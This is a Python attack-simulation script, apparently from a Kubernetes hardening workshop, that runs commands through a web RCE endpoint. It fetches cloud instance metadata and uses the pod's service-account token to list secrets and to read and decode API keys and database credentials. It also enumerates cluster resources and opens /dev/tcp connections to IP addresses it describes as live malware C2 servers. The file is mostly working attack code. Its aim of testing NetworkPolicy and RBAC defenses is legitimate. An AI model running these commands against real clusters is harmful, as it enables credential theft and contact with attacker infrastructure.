#!/usr/bin/env python3
"""
Kubernetes Attack Simulation - Day 1
Theme: "The Attacker is OUTSIDE Your Pod"

This script demonstrates attacks that will be blocked by:
- NetworkPolicy (metadata access, external egress)
- RBAC hardening (secret access, resource enumeration)

Usage:
    python3 attack_day1.py --rce-url http://<phoenix-endpoint>/<secret-path>/
"""

import requests
import argparse
import json
import sys
import re
import base64
import urllib3

# Suppress SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# ==================== CONFIGURATION ====================

RCE_URL = None
NAMESPACE = "web"


# ==================== COLORS & FORMATTING ====================

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    RESET = '\033[0m'


def banner():
    """Print the main banner"""
    print(f"""
{Colors.RED}╔═══════════════════════════════════════════════════════════╗
║{Colors.WHITE}{Colors.BOLD}        KUBERNETES ATTACK SIMULATION - DAY 1               {Colors.RED}║
║{Colors.YELLOW}        "The Attacker is OUTSIDE Your Pod"                 {Colors.RED}║
╚═══════════════════════════════════════════════════════════╝{Colors.RESET}
""")


def print_attack_header(num, total, name, description):
    """Print attack section header"""
    print(f"\n{Colors.CYAN}[{num}/{total}] {Colors.BOLD}{name}{Colors.RESET}")
    print(f"{Colors.DIM}      {description}{Colors.RESET}")
    print(f"{Colors.DIM}      {'─' * 52}{Colors.RESET}")


def print_command(cmd):
    """Print the command being executed"""
    # Truncate long commands
    display_cmd = cmd.strip().replace('\n', ' ')
    if len(display_cmd) > 70:
        display_cmd = display_cmd[:67] + "..."
    print(f"{Colors.DIM}      $ {display_cmd}{Colors.RESET}")


def success(msg, details=None):
    """Print success message"""
    print(f"\n{Colors.GREEN}      ✅ ATTACK SUCCEEDED{Colors.RESET}")
    print(f"{Colors.GREEN}      → {msg}{Colors.RESET}")
    if details:
        for detail in details:
            print(f"{Colors.GREEN}      → {detail}{Colors.RESET}")


def blocked(msg, details=None):
    """Print blocked message"""
    print(f"\n{Colors.RED}      ❌ ATTACK BLOCKED{Colors.RESET}")
    print(f"{Colors.RED}      → {msg}{Colors.RESET}")
    if details:
        for detail in details:
            print(f"{Colors.RED}      → {detail}{Colors.RESET}")


def info(msg):
    """Print info message"""
    print(f"{Colors.YELLOW}      ℹ {msg}{Colors.RESET}")


def print_summary(results):
    """Print final summary"""
    succeeded = sum(1 for r in results if r['success'])
    failed = len(results) - succeeded

    if succeeded == len(results):
        status = f"{Colors.RED}🔴 FULLY VULNERABLE{Colors.RESET}"
        status_msg = "Your pod is fully exposed!"
    elif succeeded == 0:
        status = f"{Colors.GREEN}🟢 FULLY HARDENED{Colors.RESET}"
        status_msg = "All Day 1 attacks blocked!"
    else:
        status = f"{Colors.YELLOW}🟡 PARTIALLY HARDENED{Colors.RESET}"
        status_msg = "Some defenses in place, but gaps remain"

    print(f"""
{Colors.RED}╔═══════════════════════════════════════════════════════════╗
║{Colors.WHITE}{Colors.BOLD}                        SUMMARY                            {Colors.RED}║
╠═══════════════════════════════════════════════════════════╣{Colors.RESET}
{Colors.RED}║{Colors.RESET}  {Colors.GREEN}✅ Successful attacks:{Colors.RESET}  {succeeded:>2}/{len(results):<26}{Colors.RED}║{Colors.RESET}
{Colors.RED}║{Colors.RESET}  {Colors.RED}❌ Blocked attacks:{Colors.RESET}     {failed:>2}/{len(results):<26}{Colors.RED}║{Colors.RESET}
{Colors.RED}║{Colors.RESET}                                                           {Colors.RED}║{Colors.RESET}
{Colors.RED}║{Colors.RESET}  Status: {status:<49}{Colors.RED}║{Colors.RESET}
{Colors.RED}║{Colors.RESET}  {status_msg:<57}{Colors.RED}║{Colors.RESET}
{Colors.RED}║{Colors.RESET}                                                           {Colors.RED}║{Colors.RESET}""")

    # Show what's still vulnerable
    vulnerable = [r['name'] for r in results if r['success']]
    if vulnerable and succeeded != len(results):
        print(f"{Colors.RED}║{Colors.RESET}  {Colors.YELLOW}Still vulnerable to:{Colors.RESET}                                    {Colors.RED}║{Colors.RESET}")
        for v in vulnerable[:4]:  # Show max 4
            print(f"{Colors.RED}║{Colors.RESET}  {Colors.YELLOW}• {v:<55}{Colors.RESET}{Colors.RED}║{Colors.RESET}")

    # Show defenses needed
    if succeeded > 0:
        print(f"{Colors.RED}║{Colors.RESET}                                                           {Colors.RED}║{Colors.RESET}")
        print(f"{Colors.RED}║{Colors.RESET}  {Colors.CYAN}Apply Day 1 defenses:{Colors.RESET}                                  {Colors.RED}║{Colors.RESET}")
        print(f"{Colors.RED}║{Colors.RESET}  {Colors.CYAN}• NetworkPolicy (blocks metadata, egress){Colors.RESET}              {Colors.RED}║{Colors.RESET}")
        print(f"{Colors.RED}║{Colors.RESET}  {Colors.CYAN}• RBAC hardening (blocks secret access){Colors.RESET}                {Colors.RED}║{Colors.RESET}")

    print(f"{Colors.RED}╚═══════════════════════════════════════════════════════════╝{Colors.RESET}")


# ==================== RCE HELPER ====================

def html_unescape(text):
    """Unescape HTML entities"""
    text = text.replace('&gt;', '>')
    text = text.replace('&lt;', '<')
    text = text.replace('&amp;', '&')
    text = text.replace('&#39;', "'")
    text = text.replace('&#34;', '"')
    text = text.replace('&quot;', '"')
    return text


def rce(cmd):
    """
    Execute command via RCE endpoint, return output.
    Parses HTML response to extract command output.
    """
    try:
        response = requests.post(
            RCE_URL,
            data={"cmd": cmd},
            timeout=5,
            verify=False
        )

        # Parse output from HTML response
        # Format: <pre>$ cmd\noutput</pre>
        html = response.text

        # Extract content between <pre> tags
        match = re.search(r'<pre>(.*?)</pre>', html, re.DOTALL)
        if match:
            content = match.group(1)
            # Unescape HTML entities
            content = html_unescape(content)
            # Remove the first line ($ command)
            lines = content.split('\n', 1)
            if len(lines) > 1:
                return lines[1].strip()
            return ""
        return html

    except requests.exceptions.Timeout:
        return "ERROR: Connection timeout"
    except requests.exceptions.ConnectionError:
        return "ERROR: Connection failed"
    except Exception as e:
        return f"ERROR: {str(e)}"


# ==================== ATTACKS ====================

def attack_cloud_metadata(attack_num, total):
    """Access Linode IMDS to steal instance metadata"""
    name = "Cloud Metadata Access"
    description = "Steal instance metadata from Linode IMDS (169.254.169.254)"

    print_attack_header(attack_num, total, name, description)

    # Linode uses IMDSv2-style tokens - single line command
    cmd = 'TOKEN=$(curl -s --connect-timeout 3 -X PUT -H "Metadata-Token-Expiry-Seconds: 3600" http://169.254.169.254/v1/token 2>/dev/null) && curl -s --connect-timeout 3 -H "Metadata-Token: $TOKEN" http://169.254.169.254/v1/instance 2>/dev/null'
    print_command("curl http://169.254.169.254/v1/instance")

    output = rce(cmd)

    # Check for blocked/error conditions
    # Note: If command produces no output, rce() returns full HTML as fallback
    if "ERROR:" in output or not output or "timed out" in output.lower() or "<html" in output.lower():
        blocked("Metadata service not accessible", ["NetworkPolicy blocking metadata endpoint"])
        return {"name": name, "success": False}
    elif "id:" in output or "region:" in output or "label:" in output:
        # Linode metadata returns key: value format (not JSON)
        details = []
        for line in output.split('\n'):
            if ':' in line:
                key, val = line.split(':', 1)
                key = key.strip()
                val = val.strip()
                if key == 'id':
                    details.append(f"Instance ID: {val}")
                elif key == 'region':
                    details.append(f"Region: {val}")
                elif key == 'label':
                    details.append(f"Label: {val}")
        success("Retrieved Linode instance metadata", details[:3] if details else None)
        return {"name": name, "success": True}
    else:
        blocked("Metadata service not accessible")
        return {"name": name, "success": False}


def attack_secrets_list(attack_num, total):
    """List K8s secrets in web namespace"""
    name = "K8s Secrets List"
    description = "List all secrets in web namespace via K8s API"

    print_attack_header(attack_num, total, name, description)

    # Single line command
    cmd = f'TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null) && [ -n "$TOKEN" ] && curl -sk --connect-timeout 3 -H "Authorization: Bearer $TOKEN" "https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT/api/v1/namespaces/{NAMESPACE}/secrets" 2>/dev/null || echo "NO_TOKEN"'
    print_command(f"curl -sk https://$K8S_API/api/v1/namespaces/{NAMESPACE}/secrets")

    output = rce(cmd)

    if "NO_TOKEN" in output:
        blocked("Service account token not found", ["Token may be disabled"])
        return {"name": name, "success": False}
    elif "Forbidden" in output or "forbidden" in output:
        blocked("Access denied to secrets", ["RBAC policy blocking secret access"])
        return {"name": name, "success": False}
    elif '"items"' in output or '"secrets"' in output.lower():
        # Try to count secrets
        try:
            data = json.loads(output)
            items = data.get('items', [])
            secret_names = [item['metadata']['name'] for item in items]
            success(f"Found {len(secret_names)} secrets", [f"Names: {', '.join(secret_names[:5])}{'...' if len(secret_names) > 5 else ''}"])
        except:
            success("Retrieved secrets list")
        return {"name": name, "success": True}
    else:
        blocked("Could not list secrets", [output[:80] if output else "No response"])
        return {"name": name, "success": False}


def attack_read_secret(secret_name, attack_num, total, friendly_name, expected_keys):
    """Generic function to read a specific secret"""
    name = f"Read {friendly_name}"
    description = f"Extract {friendly_name} from K8s secret '{secret_name}'"

    print_attack_header(attack_num, total, name, description)

    # Single line command
    cmd = f'TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null) && curl -sk --connect-timeout 3 -H "Authorization: Bearer $TOKEN" "https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT/api/v1/namespaces/{NAMESPACE}/secrets/{secret_name}" 2>/dev/null'
    print_command(f"curl -sk https://$K8S_API/.../secrets/{secret_name} (ns: {NAMESPACE})")

    output = rce(cmd)

    if "Forbidden" in output or "forbidden" in output:
        blocked(f"Access denied to {secret_name}", ["RBAC policy blocking secret access"])
        return {"name": name, "success": False}
    elif "not found" in output.lower():
        blocked(f"Secret '{secret_name}' not found")
        return {"name": name, "success": False}
    elif '"data"' in output:
        try:
            data = json.loads(output)
            secret_data = data.get('data', {})
            details = []
            for key in expected_keys:
                if key in secret_data:
                    # Decode base64 and show partial value
                    try:
                        decoded = base64.b64decode(secret_data[key]).decode('utf-8')
                        if len(decoded) > 30:
                            details.append(f"{key}: {decoded[:30]}...")
                        else:
                            details.append(f"{key}: {decoded}")
                    except:
                        details.append(f"{key}: <base64 encoded>")
            success(f"Extracted {friendly_name}", details or [f"Found {len(secret_data)} keys"])
        except:
            success(f"Retrieved secret data")
        return {"name": name, "success": True}
    else:
        blocked(f"Could not read secret")
        return {"name": name, "success": False}


def attack_read_secret_apikeys(attack_num, total):
    """Read api-keys secret"""
    return attack_read_secret(
        "api-keys",
        attack_num,
        total,
        "API Keys",
        ["AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY", "GITHUB_TOKEN", "STRIPE_SECRET_KEY"]
    )


def attack_read_secret_dbcreds(attack_num, total):
    """Read database-credentials secret"""
    return attack_read_secret(
        "database-credentials",
        attack_num,
        total,
        "Database Credentials",
        ["username", "password", "connection_string", "DATABASE_URL"]
    )


def attack_read_secret_webhook(attack_num, total):
    """Read webhookapikey secret"""
    return attack_read_secret(
        "webhookapikey",
        attack_num,
        total,
        "Webhook API Key",
        ["apikey", "key", "token", "WEBHOOK_KEY"]
    )


def attack_list_pods(attack_num, total):
    """List pods in web namespace"""
    name = "List Pods"
    description = "Enumerate all pods in web namespace"

    print_attack_header(attack_num, total, name, description)

    # Single line command
    cmd = f'TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null) && curl -sk --connect-timeout 3 -H "Authorization: Bearer $TOKEN" "https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT/api/v1/namespaces/{NAMESPACE}/pods" 2>/dev/null'
    print_command(f"curl -sk https://$K8S_API/api/v1/namespaces/{NAMESPACE}/pods")

    output = rce(cmd)

    if "Forbidden" in output or "forbidden" in output:
        blocked("Access denied to pods", ["RBAC policy blocking pod listing"])
        return {"name": name, "success": False}
    elif '"items"' in output:
        try:
            data = json.loads(output)
            items = data.get('items', [])
            pod_names = [item['metadata']['name'] for item in items]
            success(f"Found {len(pod_names)} pods", [f"Names: {', '.join(pod_names[:3])}{'...' if len(pod_names) > 3 else ''}"])
        except:
            success("Retrieved pod list")
        return {"name": name, "success": True}
    else:
        blocked("Could not list pods")
        return {"name": name, "success": False}


def attack_list_services(attack_num, total):
    """List services in cluster"""
    name = "List Services"
    description = "Enumerate services in cluster"

    print_attack_header(attack_num, total, name, description)

    # Single line command
    cmd = f'TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null) && curl -sk --connect-timeout 3 -H "Authorization: Bearer $TOKEN" "https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT/api/v1/namespaces/{NAMESPACE}/services" 2>/dev/null'
    print_command(f"curl -sk https://$K8S_API/api/v1/namespaces/{NAMESPACE}/services")

    output = rce(cmd)

    if "Forbidden" in output or "forbidden" in output:
        blocked("Access denied to services", ["RBAC policy blocking service listing"])
        return {"name": name, "success": False}
    elif '"items"' in output:
        try:
            data = json.loads(output)
            items = data.get('items', [])
            svc_names = [item['metadata']['name'] for item in items]
            success(f"Found {len(svc_names)} services", [f"Names: {', '.join(svc_names[:5])}"])
        except:
            success("Retrieved service list")
        return {"name": name, "success": True}
    else:
        blocked("Could not list services")
        return {"name": name, "success": False}


def attack_list_deployments(attack_num, total):
    """List deployments in web namespace"""
    name = "List Deployments"
    description = "Enumerate deployments to understand application architecture"

    print_attack_header(attack_num, total, name, description)

    cmd = f'TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null) && curl -sk --connect-timeout 3 -H "Authorization: Bearer $TOKEN" "https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT/apis/apps/v1/namespaces/{NAMESPACE}/deployments" 2>/dev/null'
    print_command(f"curl -sk https://$K8S_API/apis/apps/v1/namespaces/{NAMESPACE}/deployments")

    output = rce(cmd)

    if "Forbidden" in output or "forbidden" in output:
        blocked("Access denied to deployments", ["RBAC policy blocking deployment listing"])
        return {"name": name, "success": False}
    elif '"items"' in output:
        try:
            data = json.loads(output)
            items = data.get('items', [])
            details = []
            for item in items[:3]:
                dep_name = item['metadata']['name']
                replicas = item['spec'].get('replicas', '?')
                image = item['spec']['template']['spec']['containers'][0]['image']
                details.append(f"{dep_name}: {replicas} replica(s), {image.split('/')[-1]}")
            success(f"Found {len(items)} deployments", details)
        except:
            success("Retrieved deployment list")
        return {"name": name, "success": True}
    else:
        blocked("Could not list deployments")
        return {"name": name, "success": False}


def attack_list_endpoints(attack_num, total):
    """List endpoints to discover pod IPs"""
    name = "List Endpoints"
    description = "Discover internal pod IPs via endpoint enumeration"

    print_attack_header(attack_num, total, name, description)

    cmd = f'TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null) && curl -sk --connect-timeout 3 -H "Authorization: Bearer $TOKEN" "https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT/api/v1/namespaces/{NAMESPACE}/endpoints" 2>/dev/null'
    print_command(f"curl -sk https://$K8S_API/api/v1/namespaces/{NAMESPACE}/endpoints")

    output = rce(cmd)

    if "Forbidden" in output or "forbidden" in output:
        blocked("Access denied to endpoints", ["RBAC policy blocking endpoint listing"])
        return {"name": name, "success": False}
    elif '"items"' in output:
        try:
            data = json.loads(output)
            items = data.get('items', [])
            details = []
            for item in items[:3]:
                ep_name = item['metadata']['name']
                subsets = item.get('subsets', [])
                if subsets and 'addresses' in subsets[0]:
                    ips = [addr['ip'] for addr in subsets[0]['addresses'][:2]]
                    details.append(f"{ep_name}: {', '.join(ips)}")
            success(f"Found {len(items)} endpoints with internal IPs", details)
        except:
            success("Retrieved endpoint list")
        return {"name": name, "success": True}
    else:
        blocked("Could not list endpoints")
        return {"name": name, "success": False}


def attack_list_configmaps(attack_num, total):
    """List configmaps which may contain sensitive configuration"""
    name = "List ConfigMaps"
    description = "Enumerate configmaps for sensitive configuration data"

    print_attack_header(attack_num, total, name, description)

    cmd = f'TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null) && curl -sk --connect-timeout 3 -H "Authorization: Bearer $TOKEN" "https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT/api/v1/namespaces/{NAMESPACE}/configmaps" 2>/dev/null'
    print_command(f"curl -sk https://$K8S_API/api/v1/namespaces/{NAMESPACE}/configmaps")

    output = rce(cmd)

    if "Forbidden" in output or "forbidden" in output:
        blocked("Access denied to configmaps", ["RBAC policy blocking configmap listing"])
        return {"name": name, "success": False}
    elif '"items"' in output:
        try:
            data = json.loads(output)
            items = data.get('items', [])
            cm_names = [item['metadata']['name'] for item in items]
            success(f"Found {len(cm_names)} configmaps", [f"Names: {', '.join(cm_names[:5])}"])
        except:
            success("Retrieved configmap list")
        return {"name": name, "success": True}
    else:
        blocked("Could not list configmaps")
        return {"name": name, "success": False}


def attack_host_network(attack_num, total):
    """Check if container shares host network namespace"""
    name = "Host Network Access"
    description = "Check if container shares host network namespace"

    print_attack_header(attack_num, total, name, description)

    # To detect hostNetwork, we check for host-specific interfaces
    # With hostNetwork: we see docker0, cni0, flannel, veth*, etc. (many interfaces)
    # Without hostNetwork: we only see eth0 and lo (2-3 interfaces)
    cmd = 'ls /sys/class/net/ 2>/dev/null'
    print_command("ls /sys/class/net/  # check network interfaces")

    output = rce(cmd)

    # Host network mode exposes host interfaces like docker0, cni0, veth*, etc.
    if "docker" in output.lower() or "cni" in output.lower() or "flannel" in output.lower() or "veth" in output.lower() or "br-" in output.lower():
        success("Host network namespace access!", [
            "Can see host network interfaces",
            "Access to node's network stack",
            "Can attack IMDS, localhost services"
        ])
        return {"name": name, "success": True}

    # Count interfaces - host has many (10+), container has few (2-4)
    interfaces = [i.strip() for i in output.strip().split('\n') if i.strip()]
    iface_count = len(interfaces)

    if iface_count > 6:  # Container typically has 2-4 (lo, eth0, maybe tunl0, sit0)
        info(f"Found {iface_count} network interfaces (suspiciously many)")
        success("Likely host network access!", [
            f"Found {iface_count} interfaces: {', '.join(interfaces[:5])}...",
            "Container should have ~2-4 interfaces",
            "May have hostNetwork: true enabled"
        ])
        return {"name": name, "success": True}

    blocked("Container in isolated network namespace", [
        f"Only {iface_count} interfaces: {', '.join(interfaces)}",
        "hostNetwork disabled (required for NetworkPolicy)",
    ])
    return {"name": name, "success": False}


def attack_cnc_communication(attack_num, total):
    """Simulate C2/CNC server communication via known malware C2 servers"""
    name = "C2 Server Communication"
    description = "Connect to known malware C2 servers (from ThreatFox threat intel)"

    print_attack_header(attack_num, total, name, description)

    # Known C2 servers from ThreatFox (https://threatfox.abuse.ch)
    # These are real malware command & control servers
    c2_servers = [
        ("51.44.165.12", "Meterpreter", 6002),      # Metasploit C2
        ("151.247.25.231", "SectopRAT", 9000),      # RAT C2
        ("3.140.254.73", "Havoc", 80),              # Havoc C2 framework
    ]

    info(f"Attempting connection to {len(c2_servers)} known C2 servers...")

    for ip, malware, port in c2_servers:
        # Try TCP connection to C2 server
        cmd = f'bash -c "exec 3<>/dev/tcp/{ip}/{port} && echo CONNECTED" 2>/dev/null || echo "BLOCKED"'
        print_command(f"connect {ip}:{port}  # ({malware} C2)")

        output = rce(cmd)

        if "CONNECTED" in output:
            success("C2 communication successful!", [
                f"Connected to C2 server: {ip}:{port}",
                f"Malware family: {malware}",
                "Attacker can receive commands from C2",
                "Data exfiltration possible!"
            ])
            return {"name": name, "success": True}

    # All C2 servers blocked
    blocked("C2 communication blocked", [
        "All C2 servers unreachable",
        "NetworkPolicy blocking known malicious IPs",
        "ThreatFox blocklist working!"
    ])
    return {"name": name, "success": False}


# ==================== MAIN ====================

def main():
    global RCE_URL

    parser = argparse.ArgumentParser(
        description='Kubernetes Attack Simulation - Day 1',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 attack_day1.py --rce-url http://phoenix.example.com/debug/
  python3 attack_day1.py --rce-url http://10.0.0.5:8080/secret123/
        """
    )
    parser.add_argument(
        '--rce-url',
        required=True,
        help='RCE endpoint URL (e.g., http://host/<secret-path>/)'
    )

    args = parser.parse_args()
    RCE_URL = args.rce_url.rstrip('/') + '/'

    # Print banner
    banner()

    print(f"{Colors.DIM}Target: {RCE_URL}{Colors.RESET}")
    print(f"{Colors.DIM}Testing connection...{Colors.RESET}")

    # Test connection
    test_output = rce("echo CONNECTION_OK")
    if "CONNECTION_OK" not in test_output:
        print(f"\n{Colors.RED}ERROR: Could not connect to RCE endpoint{Colors.RESET}")
        print(f"{Colors.RED}Response: {test_output[:100]}{Colors.RESET}")
        sys.exit(1)

    print(f"{Colors.GREEN}Connected successfully!{Colors.RESET}")

    # Total number of attacks
    TOTAL_ATTACKS = 12

    # Run all attacks
    results = []

    # Attack 1: Cloud Metadata
    results.append(attack_cloud_metadata(1, TOTAL_ATTACKS))

    # Attack 2: Host Network Access (moved from Day 2 - blocked by removing hostNetwork for NetworkPolicy)
    results.append(attack_host_network(2, TOTAL_ATTACKS))

    # Attack 3: Secrets List
    results.append(attack_secrets_list(3, TOTAL_ATTACKS))

    # Attack 4: Read api-keys
    results.append(attack_read_secret_apikeys(4, TOTAL_ATTACKS))

    # Attack 5: Read database-credentials
    results.append(attack_read_secret_dbcreds(5, TOTAL_ATTACKS))

    # Attack 6: Read webhookapikey
    results.append(attack_read_secret_webhook(6, TOTAL_ATTACKS))

    # Attack 7: List Pods
    results.append(attack_list_pods(7, TOTAL_ATTACKS))

    # Attack 8: List Services
    results.append(attack_list_services(8, TOTAL_ATTACKS))

    # Attack 9: List Deployments
    results.append(attack_list_deployments(9, TOTAL_ATTACKS))

    # Attack 10: List Endpoints (pod IPs)
    results.append(attack_list_endpoints(10, TOTAL_ATTACKS))

    # Attack 11: List ConfigMaps
    results.append(attack_list_configmaps(11, TOTAL_ATTACKS))

    # Attack 12: C2 Communication
    results.append(attack_cnc_communication(12, TOTAL_ATTACKS))

    # Print summary
    print_summary(results)

    # Exit with appropriate code
    succeeded = sum(1 for r in results if r['success'])
    if succeeded == 0:
        sys.exit(0)  # All blocked = success (hardened)
    else:
        sys.exit(1)  # Some attacks succeeded = vulnerable


if __name__ == "__main__":
    main()